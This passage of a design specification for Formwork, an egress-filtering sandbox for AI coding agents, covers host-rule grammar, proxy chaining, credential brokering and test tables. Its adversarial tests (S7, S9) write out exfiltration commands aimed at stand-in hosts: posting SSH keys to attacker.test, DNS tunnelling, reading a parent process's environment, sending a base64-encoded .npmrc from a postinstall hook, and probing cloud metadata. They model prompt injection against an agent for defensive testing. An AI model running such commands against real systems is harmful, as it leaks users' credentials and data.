4. `api.anthropic.com` gets `allow:`, every method; each host has exactly one grade (FEP-5 `FW-BP14`).

<a id="fw-e2e-102"></a>**FW-E2E-102: test form (Phase B, both OSes; row 5 Linux only).** `docs.python.org` becomes
`docs.test`; `*.readthedocs.io` becomes `*.rtd.test`; `api.anthropic.com` becomes `model.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `curl -sS https://docs.test/3/library/` | the fixture's body |
| 2 | `curl -sS -I https://docs.test/3/` | `200` for HEAD |
| 3 | `curl -sS -X POST -d q=1 https://docs.test/search` | `403`; violation `method`; the fixture logs nothing |
| 4 | `curl -sS -X TRACE https://docs.test/` | `403`; violation `method` (`FW-EGR23`) |
| 5 | `curl -sS https://proj.rtd.test/en/latest/`, answered with the namespace fixture's address | the fixture's body; the leaf's issuer is the session CA |
| 6 | `curl -sS https://rtd.test/` | curl exit 56; violation `host-not-listed` (a wildcard excludes the apex) |
| 7 | `curl -sS -X POST -d '{}' https://model.test/ok` | the fixture's body: `allow:` admits every method, unlike the documentation hosts |

Pass: every row as stated. Fail: any row differs.

#### S6. Corporate network: intranet by name, egress through the corporate proxy

**Configuration.**

```toml
extends = ["builtin:default"]
rules = [
  "readwrite:$CWD/**",
  "allow:api.anthropic.com",
  "allow:git.corp.internal",         # resolves to 10.20.0.5; admitted because the rule is an exact name
  "allow:artifacts.corp.internal",
]
```

`formwork run`'s own environment, set by the operator's machine:

```sh
export HTTPS_PROXY=http://proxy.corp.internal:3128
export NO_PROXY=.corp.internal
export SSL_CERT_FILE=/etc/corp/ca-bundle.pem   # public roots plus the corporate TLS-inspection root
```

**Where it fits.** Enterprise laptops and runners where direct internet egress is blocked, a
corporate proxy is mandatory (often one that inspects TLS), and internal services have private
addresses.

**How it works.**

1. The engine loads upstream trust from `SSL_CERT_FILE` (§4.12), which holds the corporate
   inspection root, so it verifies the certificates the corporate proxy re-signs. The agent's clients
   see session leaves and trust the session bundle, which is built from the same roots.
2. `CONNECT api.anthropic.com:443` matches an `allow:` rule and `NO_PROXY` does not exempt it. The
   engine terminates the client's TLS, and opens each upstream connection by sending
   `CONNECT api.anthropic.com:443` to `proxy.corp.internal:3128`, then TLS through it. The corporate
   proxy resolves the name, so address classification for this host is `Partial` (`FW-EGR26`), and
   the report says so.
3. `CONNECT git.corp.internal:443` is exempted by `NO_PROXY`. The engine resolves it, gets
   `10.20.0.5`, and admits the private address because the rule is an exact name (`FW-EGR19`).
4. A rule `allow:*.corp.internal` would refuse `10.20.0.5` as `address-class`: wildcards never reach
   private addresses.
5. The proxy's own address comes from the operator's environment and is not classified. The agent
   cannot reach the proxy itself; a direct `connect()` to it is refused like any other.

*Variant: stacked under Omnigent* (`docs/omnigent-integration-eval.md`, Option B). Omnigent's
in-namespace relay is the upstream proxy (`HTTPS_PROXY`), and Omnigent's MITM CA arrives through
`SSL_CERT_FILE`, so the same mechanism chains Formwork's engine into Omnigent's. Both allowlists
apply, so a host must pass both. If both layers broker the same credential, Formwork adds the header
first and Omnigent, which never overwrites a present header, forwards it.

<a id="fw-e2e-103"></a>**FW-E2E-103: test form (Phase C, both OSes).** `proxy.test` is a CONNECT-proxy fixture that
records each CONNECT line and forwards to the fixture addresses. `model.test` is reached through it.
`git.corp.test` is a fixture on `127.0.0.2`. `formwork run` gets `HTTPS_PROXY=http://proxy.test:3128`
and `NO_PROXY=.corp.test`.

| # | Step | Expected |
|---|---|---|
| 1 | `curl -sS https://model.test/ok` | the fixture's body; `proxy.test` logs `CONNECT model.test:443` |
| 2 | `curl -sS https://git.corp.test/ok` | the fixture's body; `proxy.test` logs nothing for it |
| 3 | `curl -sS --noproxy '*' http://<proxy.test's address>:3128/` | curl exit 7; refusal record; `proxy.test` logs nothing |
| 4 | outside: `formwork explain --json` | `model.test` classification `Partial`, reason naming the upstream proxy; `git.corp.test` `Enforced` |
| 5 | a second blueprint with only `allow:*.corp.test`: `curl -sS https://git.corp.test/ok` | curl exit 56; violation `address-class` |

Pass: every row as stated. Fail: any row differs.

#### S7. Exfiltration attempts against S2

**Setup.** S2's test form, with the planted fake credentials of FEP-2's fixture home, an attacker
fixture `attacker.test` that is not admitted, and `model.test` serving `/reflect` (echoes request
headers in the body; `?gzip=1` compresses; `?in=header` echoes into a response header).

**Where it fits.** This is the prompt-injection threat the configuration exists for, as one battery.
Each row names the mechanism that stops it, and the last row is what the configuration admits by
design.

<a id="fw-adv-025"></a>**FW-ADV-025: test form (Phase B, both OSes).**

| # | Attempt | Step | Expected | Mechanism |
|---|---|---|---|---|
| 1 | send a key file to an unlisted host | `curl -sS -d @$HOME/.ssh/id_ed25519 https://attacker.test/` | the read fails with `EACCES`, and the CONNECT gets `403` | credential floor; `host-not-listed` |
| 2 | read the key back through an echo | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/reflect` | connection reset; violation `reflection`; no 8-byte run of the key in curl's output | `FW-CRED17` |
| 3 | echo into a header | `…/reflect?in=header` | as row 2 | `FW-CRED17` |
| 4 | echo compressed | `…/reflect?gzip=1` | response refused; violation `reflection` | identity coding |
| 5 | carry the placeholder in a query | `curl -sS "https://other.test/?k=$FIXTURE_MODEL_KEY"` | `403`; violation `placeholder` | placeholder scan |
| 6 | raw socket to an address | `python3 -c 'import socket; socket.create_connection(("198.51.100.7", 443))'` | `PermissionError`; refusal record | supervisor (Linux), Seatbelt (macOS) |
| 7 | DNS tunnel | `python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)'` and `getaddrinfo("c2VjcmV0.attacker.test", 53)` | `PermissionError`; `gaierror` | FEP-5 `FW-ISO11`, `FW-EGR12` |
| 8 | read the Gateway's environment or memory | `cat /proc/$PPID/environ`; `head -c1 /proc/$PPID/mem` (Linux); `ps -E -p $PPID` (macOS) | permission denied on Linux; no environment shown on macOS **(characterize)** | `FW-CRED16`; FEP-5 `FW-ISO16` |
| 9 | front a blocked host behind an admitted name | `fw-egress-probe inspect model.test:443 --host attacker.test` | `403`; violation `host-mismatch` | FEP-5 `FW-EGR10` |
| 10 | ask a host service to fetch | `xdg-open "https://attacker.test/?d=1"` (Linux), `open` (macOS) | refused; `attacker.test` logs nothing | FEP-5 channel baseline (`FW-ADV-020`) |
| 11 | send code to the model host | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" -d @src/main.rs https://model.test/v1/messages` | succeeds | admitted by design: an admitted host receives what the agent sends; the floor and the environment scrub bound what the agent has |

Pass: rows 1–10 refused with their records and `attacker.test` logs nothing; row 11 succeeds. Fail:
any refusal row reaches a fixture, or a key byte sequence reaches the session.

#### S8. Blueprints the compiler refuses

**Where it fits.** A team reviewing a shared blueprint, or an embedder generating one. Each row is a
mistake that would otherwise produce a sandbox other than the one written; the compiler refuses it
and names the lines, before anything runs.

<a id="fw-e2e-104"></a>**FW-E2E-104: test form (Phase A for rows 1, 4–7a and 8; Phase B for rows 2, 3 and 7b; pure
compile, both OSes).** Each row runs outside the session:
`formwork compile --report-only --blueprint <file>`.

| # | Blueprint lines | Expected | Rule |
|---|---|---|---|
| 1 | `rules = ["tunnel:api.github.com", "get:api.github.com/repos/**"]` | refused; the message names both lines | one grade per host and port (FEP-5 `FW-BP14`, §9 j) |
| 2 | `rules = ["tunnel:github.com"]` and `allow-credentials = ["broker:github"]` | refused; the message names the lines to use, `allow:github.com` in place of the `tunnel:` line, and `allow:api.github.com` | FEP-5 `FW-CRED12` |
| 3 | `rules = ["get:status.corp.internal:80/**"]` and an inline binding bound to `status.corp.internal` | refused; the message names the port-80 rule | `FW-CRED19`, §9 (i) |
| 4 | `net = { ports = [443] }` and `rules = ["allow:api.anthropic.com"]` | refused | FEP-5 `FW-BP13` |
| 5 | `rules = ["tunnel:api.github.com", "deny:api.github.com/repos/acme/secret/**"]` | refused; a path `deny` needs an inspected host | FEP-5 `FW-BP14` |
| 6 | `rules = ["allow:*"]` | refused at parse; the message states the host grammar | FEP-5 §4 |
| 7 | `rules = ["tunnel:api.anthropic.com/v1/**"]` | refused at parse; a tunnel has no path (`allow:api.anthropic.com/v1/**` inspects) | §9 j |
| 7a | `rules = ["allow:build/**"]` | refused at parse; a host target needs a dot (a relative path typed by mistake) | `FW-BP16` |
| 7b | `rules = ["tunnel:internal.corp.example:8443", "allow:internal.corp.example"]` | compiles; the two rules name different ports | §9 j |
| 8 | `rules = ["deny:telemetry.example.com"]` and no admitting rule | compiles; the report states that egress is denied | [FW-EGR2](fep-1.md#fw-egr2) |

Pass: each row's outcome and named lines as stated. Fail: any row compiles when refusal is stated,
or the reverse.

#### S9. Bootstrapping a CI allowlist with `learn`

**Configuration**, the first draft of a new pipeline's `ci.toml`:

```toml
extends = ["builtin:default"]
rules = ["readwrite:$CWD/**", "allow:registry.npmjs.org"]
```

```sh
formwork learn --blueprint ci.toml -- npm ci
```

**Where it fits.** The first runs of a new pipeline or agent task, when the host list is unknown.
`learn` runs the workload enforced, turns `host-not-listed` refusals into proposed rules, and the
operator accepts them entry by entry (FEP-5 `FW-DISC12`,
[FW-DISC5](../formwork.md#fw-disc5)).

**How it works.** Suppose one dependency is a git dependency fetched from `codeload.github.com`, and a
compromised package's `postinstall` requests
`https://telemetry.evil.example/?d=$(base64 < ~/.npmrc)` and
`http://169.254.169.254/latest/meta-data/iam/`.

1. The `codeload.github.com` fetch is refused; `learn` proposes `allow:codeload.github.com`.
2. The `~/.npmrc` read is denied by the credential floor (`npm` type), so the query carries nothing.
   The telemetry request is refused, and `learn` proposes `allow:telemetry.evil.example`: `learn`
   proposes every observed host outside the floor, and the operator's review is where a hostile host
   is rejected. It is not a malware filter.
3. The metadata request is withheld and itemized, never proposed.
4. `npm ci` stops at its first failed fetch, so a pipeline with several missing hosts can take one
   `learn` pass per host.

<a id="fw-e2e-105"></a>**FW-E2E-105: test form (Phase B, both OSes; extends FEP-5 `FW-E2E-085`).**
`registry.npmjs.org`, `codeload.github.com` and `telemetry.evil.example` become `npm.test`,
`codeload.test` and `evil.test`.

| # | Step | Expected |
|---|---|---|
| 1 | outside: `formwork learn --blueprint ci.toml -- npm ci` | the proposal holds `allow:codeload.test` and `allow:evil.test`, each with provenance; `169.254.169.254` is itemized as withheld |
| 2 | outside: accept `allow:codeload.test` only (`formwork learn --accept`) | the discovered layer holds that one rule |
| 3 | `npm ci` under the accepted blueprint | succeeds; `evil.test` logs nothing; violation `host-not-listed` for `evil.test` |

Pass: every row as stated. Fail: the metadata address is proposed, or `evil.test` receives a request.

#### S10. A test server inside the session

**Configuration.** S1, in a project whose `npm test` starts an HTTP server on `127.0.0.1:0` and
requests it.

**Where it fits.** Test suites that start a local server (Express, Flask, a mock API) and call it are
common, and they run inside the same session as the agent.

**How it works today, and what is missing.** Two things break it under FEP-5 as drafted. The Launcher
empties `NO_PROXY`, so an HTTP client sends `http://127.0.0.1:3000/` to the engine, which refuses an
unlisted IP literal. A client that connects directly is refused by the supervisor, which admits only
the Gateway endpoint (§11, "In-session loopback"). The resolution this test accepts: the Launcher
sets `NO_PROXY=localhost,127.0.0.1,::1`, and the supervisor admits a loopback `connect()` whose port
is bound by a session process.

<a id="fw-e2e-106"></a>**FW-E2E-106: test form (blocked on §11; Linux first).** A harness fixture outside the session
listens on `127.0.0.1:<port>`.

| # | Step | Expected |
|---|---|---|
| 1 | `node -e` script: listen on `127.0.0.1:0`, then `fetch` it | succeeds |
| 2 | `curl -sS http://127.0.0.1:<fixture port>/` | refused; refusal record; the fixture logs nothing |

Pass: row 1 succeeds and row 2 is refused. Fail: row 1 is refused, or row 2 reaches the fixture. The
macOS form waits for a Seatbelt design that can tell a session-bound port from a host service.

### 7.3 Tests

Draft numbers continue above `FW-E2E-091` and `FW-ADV-020`.

- <a id="fw-e2e-092"></a>**FW-E2E-092: Chunked and large uploads (both).** Against an inspected fixture: a `git push` of a
  pack larger than 1 MiB, and a 256 MiB `POST` from curl. Pass: the fixture receives both bodies
  byte-identical, and the Gateway's resident memory grows by less than 16 MiB during the upload.
  Fail: either body differs or stalls, or memory grows past the bound.
- <a id="fw-e2e-093"></a>**FW-E2E-093: Streaming (both).** A fixture emits one server-sent event every 200 ms for 30 s on
  an inspected host with a brokered credential. Pass: every event reaches the client within 20 ms of
  the fixture writing it. Fail: any event is later.
- <a id="fw-e2e-094"></a>**FW-E2E-094: Client matrix (both).** curl, git, Python `requests`, Python `urllib`, pip, Node
  `fetch` and `https` with the Launcher's variables, npm, Go `net/http`, uv, cargo and rustup each
  fetch from a tunnel fixture and an inspected fixture. Pass: the results match the matrix recorded
  in the repository, which also records name-constraint enforcement per client. Fail: a result
  differs from the recorded matrix.
- <a id="fw-e2e-095"></a>**FW-E2E-095: Upstream reuse (both).** Twenty sequential requests from one client to one
  inspected fixture. Pass: the fixture observes one TLS handshake. Fail: more than one.
- <a id="fw-e2e-096"></a>**FW-E2E-096: Latency budget (both).** Medians over 1,000 requests against a loopback fixture,
  compared with the same client connecting directly. Pass: the §9 (f) targets. Fail: any median
  exceeds its target.
- <a id="fw-e2e-097"></a>**FW-E2E-097: Session CA shape (both).** Pass: the bundle's session certificate is a CA with path
  length 0 and the name constraints `FW-EGR25` lists; no file under the session scratch, `$HOME` or
  the temporary directories contains the CA private key after the session starts; the leaf for an
  inspected host verifies with `openssl verify` against the bundle. Fail: any of these does not
  hold.
- <a id="fw-adv-021"></a>**FW-ADV-021: Credential reflection.** Under `broker:anthropic` bound to `allowed.test`, the
  fixture echoes the request's `x-api-key` in its body with the value split across two writes 50 ms
  apart, in a response header, and in a gzip-encoded body; the client also sends TRACE. Pass: no
  byte sequence of length 8 or more from the credential reaches the client, and each case emits
  `reflection` or a TRACE refusal. Fail: any credential sequence reaches the client.
- <a id="fw-adv-022"></a>**FW-ADV-022: Name disagreement.** A CONNECT to `allowed.test` with server name `blocked.test`; a
  matching server name with `Host: blocked.test` inside an inspected tunnel; a tunnel whose first
  byte is not `0x16`; a ClientHello offering only `h2` to an inspected host. Pass: each is refused
  with `sni-mismatch`, `host-mismatch`, `not-tls` or `alpn`, and the blocked fixture sees no
  connection. Fail: any reaches a fixture.
- <a id="fw-adv-023"></a>**FW-ADV-023: Address classes.** Under `allow:*.test`, the resolver fixture answers
  `127.0.0.1`, `10.0.0.1`, `100.100.100.200`, `168.63.129.16`, `::ffff:169.254.169.254`,
  `64:ff9b::a9fe:a9fe`, `2002:a9fe:a9fe::1`, `fe80::1`, a public address mixed with `10.0.0.1`, an
  address of the runner's own interfaces, and the Gateway's own listener address. Then, under the
  exact rule `allow:allowed.test`, it answers `127.0.0.1` and then `169.254.169.254`. Pass: every
  wildcard case and the exact-name metadata case are refused with `address-class`, and the
  exact-name loopback case is admitted. Fail: any other outcome.
- <a id="fw-adv-024"></a>**FW-ADV-024: Parser battery (`FW-INV15`).** Heads carrying both `Content-Length` and
  `Transfer-Encoding`, two differing `Content-Length` values, obsolete line folding, a bare LF, a NUL
  in a header value, an invalid method token, a head over **head-limit**, CONNECT authorities with
  userinfo, a path, a zone identifier, a percent-encoded dot, or a numeric spelling (`2130706433`,
  `0x7f.1`, `127.1`), and a truncated ClientHello. Pass: the fixture upstream receives no byte from
  any of them. Fail: any byte arrives.

The parsers in `FW-ADV-024` (authority, path canonicalization, ClientHello buffering) are also fuzz
targets once the fuzz infrastructure that `docs/STATUS.md` defers exists.

### 7.4 Phasing

Phases A, B and C landed together; the HTTP/2 spike has not run. The phases below record the order
the requirements depend on one another, and `docs/fep-6-plan.md` §4 which scenario tests run
where.

- **Phase A**, with FEP-5 Phase 2: the front door, authority parsing, the host table, destination
  classification, tunnel grade, plain HTTP, records. `FW-EGR16`–`FW-EGR19`, `FW-EGR21`,
  `FW-FID12`, `FW-FID13`, `FW-INV15`.
- **Phase B**, with FEP-5 Phase 3: inspection, the session CA, the upstream pool, brokering, the
  reflection guard and custody. `FW-EGR20`, `FW-EGR22`–`FW-EGR25`, `FW-CRED16`–`FW-CRED19`.
- **Phase C**: WebSocket upgrade on inspected hosts; upstream proxy chaining (`FW-EGR26`).
- **HTTP/2 on inspected hosts**: after the §11 spike.

---

## 8. Comparison after this FEP

Conditional on FEP-5's transport landing and on the **(characterize)** marks above.

| Property | Omnigent | Formwork engine |
|---|---|---|
| Implementation | Python asyncio, `ssl`, `cryptography`; parent-process thread | Rust, `hyper`, `rustls`; in the Gateway's `tokio` runtime |
| Grades | every host terminated; HTTP/2 relayed opaquely for unrestricted hosts | inspected by default; `tunnel:` per host (server-name check, no termination) as the exception |
| Request framing | `Content-Length` only; body buffered whole | `Content-Length` and chunked; streamed |
| Upstream connections | one per request | pooled keep-alive per host |
| CA | RSA-2048 on disk, 365 days, reused across sessions | ECDSA P-256 in memory, per session, name-constrained |
| Path matching | raw path | canonical path |
| Destination classes | non-global plus Azure WireServer; one global opt-out flag | per-class table with embedded-IPv4 checks; local and private by exact name only |
| Credential presentation | `Authorization` only | any scheme header (FEP-5); never on OPTIONS; TRACE refused |
| Credential reflection | not guarded | identity coding plus a streaming scan (`FW-CRED17`) |
| Refusal body | names method, host and path | fixed; detail on the operator channel |
| Records | log lines | violation and grant records with a closed reason set |

---

## 9. Amendments (applied on landing)

All are applied. FEP-5 had landed, so each amendment to one of its drafts was a change to landed text
and, where that text is implemented, to code.

**(a) FEP-5 `FW-CRED11`.** Replace "refusing with a violation record where the placeholder is
carried toward any other host" with "refusing with a violation record where the placeholder appears
in the request target or a header value of a request to any other inspected host". The engine
cannot see inside a tunnel (§4.7).

**(b) `docs/fep-1.md` [FW-EGR4](fep-1.md#fw-egr4) and [FW-ADV-008](fep-1.md#fw-adv-008).** Replace
the range list in FW-EGR4 with a reference to the class table of FEP-6 §4.5 once it lands in
`formwork.md`, and state the admission rule of `FW-EGR19`. Run FW-ADV-008 under a wildcard rule,
and add its exact-name metadata case from `FW-ADV-023`.

**(c) FEP-5 §3.1, Launcher variables.** Add the lowercase proxy variables, both spellings of
`no_proxy`, and `NODE_USE_ENV_PROXY=1` (§4.11).

**(d) FEP-5 §4, Dependencies.** Replace the paragraph with a reference to FEP-6 §5.

**(e) FEP-5 §9, "HTTP/2 on inspected hosts".** Closed for the first release by §4.8: HTTP/1.1 only
through ALPN, refusal with an operator line for clients that offer only `h2`. The spike in §11
decides whether HTTP/2 follows.

**(f) `formwork.md` §8, Performance target.** Add rows, measured by `FW-E2E-096` on a loopback
fixture:

| Path | Target |
|---|---|
| Tunnel grade, added time to first response byte, new connection | < 2 ms median |
| Inspected grade, added time per request on a reused connection | < 1 ms median |
| Inspected grade, first connection to a host (leaf minting included) | < 5 ms median |

**(g) FEP-5 §8 and §9.** "Portable fs groups" was FEP-5's recommended FEP-6; it becomes the
recommended FEP-7. Applied on this branch.

**(h) `formwork.md` §11, "Linux gateway egress isolation build-vs-buy".** FEP-5 (f) narrows it to
the optional network-namespace path; this FEP records that the proxy itself is built (§3).

**(i) FEP-5 `FW-CRED12`.** Add: the compiler also rejects a blueprint that brokers a credential to
a bound host whose only inspected rule forwards without TLS (port 80), naming the rule to change
(`FW-CRED19`).

**(j) FEP-5 §4 host-rule verbs, `FW-BP13` and `FW-BP14`: `allow` and `tunnel`, with inspection as
the default.** Replace the host-rule atoms `any` and `https` with `allow` and `tunnel`:

| Rule | Grade | Meaning |
|---|---|---|
| `allow:host[:port][/glob]` | inspected | every method on matching paths; an absent path means `/**` |
| `get,post,…:host[:port][/glob]` | inspected | those methods on matching paths |
| `deny:host[:port][/glob]` | — | terminal refusal (unchanged) |
| `tunnel:host[:port]` | tunnel | TLS to this host, forwarded after the server-name check (§4.3); no path; `Partial` |

- **Inspection is the default grade; a tunnel is opt-in per host.** This reverses FEP-5 §1.1's "TLS
  termination is opt-in per host", so the plainest rule carries the strongest check. A client that
  rejects the session CA fails with one operator line naming the host and suggesting `tunnel:` for it
  (FEP-5 `FW-FID9`).
- **`allow` works on both axes, as `deny` does, and means the ordinary full grant on each.** On the
  fs axis it is read, write and create ([FW-CAP9](../formwork.md#fw-cap9)), with execute spelled
  separately (`exec`). On the egress axis it is every request, inspected, with pass-through spelled
  separately (`tunnel`).
- **Target shape** (`FW-BP16`). A target beginning with `/`, `~` or `$` is a path pattern; any other
  target is a host, which must contain a dot, be `localhost`, or be an IP literal. `allow:build/**`,
  a relative path typed by mistake, is a parse error, not a rule for a host named `build`. The same
  check covers `deny:`.
- **One grade per host and port.** `FW-BP14` keys on host and port, so
  `tunnel:internal.corp.example:8443` and `allow:internal.corp.example` compile together.
- **The rule-form table in FEP-5 §4** renames its `https:host[:port]` row to `tunnel:host[:port]`,
  and its `<methods>:host[/glob]` row covers `allow:`.
- **Omnigent translation.** `"* host/**"` becomes `allow:host`; `"GET,POST host/path"` becomes
  `get,post:host/path`.
- **`learn`** (FEP-5 `FW-DISC12`) proposes `allow:<host>` for a `host-not-listed` refusal, and
  `tunnel:<host>` for a host whose clients rejected the session CA, listed separately so the operator
  sees the grade drop.
- **FEP-5 §9's open question on `any:` is closed.** No `tcp:` verb is added; non-HTTP TCP stays with
  FEP-1's port-scoped fd (§11).
- **Vocabulary.** Add to FEP-5 §7 (i)'s block: **tunnel** = a host grant the Gateway forwards
  without terminating TLS, checking the host and the server name but not the contents.
- **Adoption.** FEP-5 landed with `https:` and `any:` in the parser
  (`crates/formwork-blueprint/src/egress.rs`), the `learn` proposals (`discovery.rs`), the compiler
  messages (`credential.rs`), the shipped examples and their tests. Adopting (j) changes each of
  them, and changes the shipped examples' hosts from tunnel to inspected, so their clients must trust
  the session CA. The old spellings are removed, not aliased: no tagged release has shipped them, so
  there is no released surface to deprecate (constitution Precedence & Conflicts), and a blueprint
  that still writes `https:` or `any:` is refused at parse with the verbs to use.

---

## 10. Decisions (recorded per constitution Precedence & Conflicts)

- **`allow` and `tunnel`, not `any` and `https`.** `https:` named a protocol the Gateway never
  verifies: it checks a TLS ClientHello and cannot tell HTTP from anything else inside the tunnel.
  `any:` sounded like the widest grant while naming a middle one, in a grammar shared with the
  filesystem, where the ordinary full grant is `allow`. The rule behind the choice: a verb used on
  both axes means the same strength on both, and no verb sounds total unless it is the widest grant
  of its axis. Considered and rejected:
  - `tls:`: accurate, but inspected traffic is TLS too;
  - `http:`: reads as plaintext HTTP;
  - `*`: Omnigent's spelling, and it sounds total, as `any` does;
  - `passthrough:`: already names the Gateway forwarding granted MCP traffic unchanged
    ([FW-GW8](../formwork.md#fw-gw8)) and an `env` posture;
  - `opaque:`: a new term, and an adjective;
  - `allow:` as the tunnel: the plainest word would select the weakest grade.
- **Inspection is the default grade.** "L7 egress" means request-level checks; with the tunnel as the
  default, the simplest rule gave FEP-1's `Partial` grade and inspection was opt-in. Omnigent
  inspects every host; Codex, Vercel, sandbox-runtime and `gh-aw-firewall` inspect selectively
  because some clients cannot be inspected, which `tunnel:` serves. Cost: every session with host
  rules has a session CA, and a client that ignores the CA variables needs `tunnel:` for its hosts.
- **No `tcp:` verb.** Destination-only TCP is not L7. Non-HTTP TCP (SSH to a Git host, database
  protocols) stays with FEP-1's port-scoped fd.
- **Build, in-process, in Rust.** Sidecars fail the self-contained-binary rule and move the
  decision, the credential and the record out of the Gateway (§3.1); frameworks dial tunnelled hosts
  themselves and cost 67–228 crates (§3.2). The composed engine costs 34 (§3.4).
- **`ring`, not `aws-lc-rs`.** `ring` needs only `cc` and 10 fewer crates. `aws-lc-rs` is the only
  `rustls` provider with the post-quantum hybrid key exchange, so the engine's own upstream
  connections from inspected hosts do not offer it; tunnel-grade connections keep whatever the
  client negotiates. Revisited in §11.
- **`rustls-native-certs`, not `rustls-platform-verifier`.** The session bundle (§4.6) must list the
  roots the engine trusts, and only `rustls-native-certs` exports them; using it for upstream
  verification as well keeps one source for both. The platform verifier would add revocation
  checking on macOS and 6–15 crates.
- **A per-host pool of `hyper::client::conn::http1` connections, not `hyper-util`'s pooled
  client.** The connector has to resolve, classify and dial (§4.5) on every new connection; keeping
  it in the engine's own code keeps that sequence in one place.
- **Tunnel grade checks the server name.** FEP-1's grade trusts the client's claim; comparing the
  ClientHello's server name with the CONNECT host costs one parse with rustls's own acceptor and
  refuses the cheapest fronting variant, a CONNECT to one name carrying a ClientHello for another.
- **Local and private addresses by exact name.** FEP-1's reading, IP literals only, leaves intranet
  hosts unreachable by name and contradicts its own loopback fixture; Omnigent's single
  `egress_allow_private_destinations` flag opens every rule at once. Exact-name admission ties the
  opening to one line of the file, and wildcards, which the rebinding attacks depend on, never get
  it.
- **Identity coding on brokered responses.** Scanning a compressed response needs a decompressor in
  the Gateway and a second copy of the body; asking for identity costs bandwidth only on responses
  to requests that carried a brokered credential.
- **End the response on reflection, never mask it.** A same-length mask keeps framing valid but
  alters a response silently; ending it is the fail-loud choice ([FW-INV6](../formwork.md#fw-inv6))
  and the violation record names the cause.
- **Hold back only a matching prefix.** A fixed hold-back window of the credential's length would
  delay the tail of every streamed event until the next one arrived.
- **One leaf key per session, separate from the CA key.** A key per host buys nothing when every
  key lives in the same process, and a shared key makes minting a signature only. Serving leaves
  with the CA's own key, as `hudsucker` does, would put the signing key in every handshake.
- **Name constraints on the session CA.** They cost one extension and bound what a leaked key could
  impersonate to the hosts the file already inspects.
- **HTTP/1.1 first.** Every model API and registry the examples use accepts it, and
  server-sent-event and chunked streaming work over it. An HTTP/2 server adds 5 crates and places
  `h2`, with four flood advisories since 2023, on a socket the confined process controls (§2.3).
  Codex terminates HTTP/2 on both sides; sandbox-runtime and httpjail do not.
- **No SOCKS5.** Codex and sandbox-runtime offer it for non-HTTP TCP. Under host rules Formwork's
  answer to non-HTTP TCP is the port-scoped fd ([FW-GW6](../formwork.md#fw-gw6)), which needs a
  grammar first (§11); a SOCKS front door would be a second, weaker path to the same place.
- **Host resolver, not a bundled one.** `getaddrinfo` honors `/etc/hosts`, NSS and corporate
  split-horizon DNS, and adds no crate; `hickory-resolver` would add a DNS implementation to the
  trust base and diverge from what the operator's own tools resolve.

---

## 11. Open questions

- **HTTP/2 on inspected hosts.** A spike measures, for the model-API clients in the examples,
  whether any requires HTTP/2 on a host that needs inspection, and prices `hyper`'s HTTP/2 server
  with the reset-stream limits configured. Owner: Phase B review.
- **Gateway self-confinement.** The engine parses bytes from the confined process in the process
  that holds brokered credentials. Landlock on the Gateway's threads (network: the ports its rules
  name; filesystem: the trust store and credential sources) would contain a parser defect; it has
  to be applied after every stdio MCP backend is spawned, because a Landlock domain is inherited.
  A spike decides the ordering on Linux; macOS has no per-thread equivalent.
- **Privilege separation.** Terminating TLS in a worker process that holds no credential, with the
  parent presenting credentials, would keep a parser defect away from the vault. It costs a process
  and an IPC hop per request. Deferred until the self-confinement spike reports.
- **Original-destination front door.** FEP-5's "Transparent mode" would serve clients that ignore
  proxy variables. The engine's stages 3 to 6 are ready for it (§4.2); what is missing is a name
  source, since local resolution is closed under host rules (FEP-5 `FW-EGR12`). A synthetic
  resolver answering from the host table is one design.
- **In-session loopback (raised for FEP-5).** Under host rules, FEP-5's supervisor and macOS
  profile refuse a `connect()` to `127.0.0.1:<port>` even when the listener belongs to the session,
  which breaks test suites that start a local server; and because the Launcher empties `NO_PROXY`,
  an HTTP client sends even a loopback request to the engine. Setting
  `NO_PROXY=localhost,127.0.0.1,::1` and admitting loopback connections to ports bound by session
  processes closes this on Linux; on macOS, SBPL cannot express "bound by the session", and
  `localhost:*` would open every host service on loopback. S10 (`FW-E2E-106`) is the acceptance
  test.
- **Non-HTTP TCP.** SSH to a Git host and database protocols need a rule form for a port-scoped fd
  (FEP-1, [FW-GW6](../formwork.md#fw-gw6)). A grammar proposal belongs with FEP-5's `rules`; this FEP
  proposes no `tcp:` verb (§10).
- **Encrypted Client Hello.** Refused today as a server-name mismatch. If an agent toolchain enables
  ECH by default, tunnel grade needs a policy for the outer name.
- **Post-quantum key exchange upstream.** With `ring`, the engine's upstream TLS from inspected
  hosts offers classical key exchange only. Moving to `aws-lc-rs` (10 more crates, a C and C++
  build) buys the hybrid group. Owner: Phase B review.
- **Placeholder shape.** FEP-5's placeholder is `fwcred-<type>-<nonce>`; Codex and sandbox-runtime
  give the dummy the credential's prefix and length, so a client that checks a key's format
  locally accepts it. A shaped dummy loses the prefix the engine scans for, so detection would
  match exact placeholder values instead. The client matrix (`FW-E2E-094`) shows whether any
  shipped example's client checks format.
- **Upstream proxy authentication.** `FW-EGR26` supports proxies without authentication or with
  Basic credentials in the proxy URL. NTLM and Kerberos proxies are not supported.
